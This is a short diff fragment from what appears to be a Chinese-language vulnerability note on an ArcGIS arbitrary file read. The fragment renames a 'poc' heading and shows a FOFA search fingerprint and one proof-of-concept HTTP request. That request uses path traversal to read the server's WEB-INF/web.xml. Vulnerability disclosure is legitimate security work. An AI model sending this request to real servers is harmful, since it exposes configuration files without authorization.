@@ -8,7 +8,7 @@ ArcGIS地理信息系统 存在任意文件读取漏洞，未经身份验证攻�
 app="esri-ArcGIS"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /arcgis/manager/3370/js/../WEB-INF/web.xml HTTP/1.0
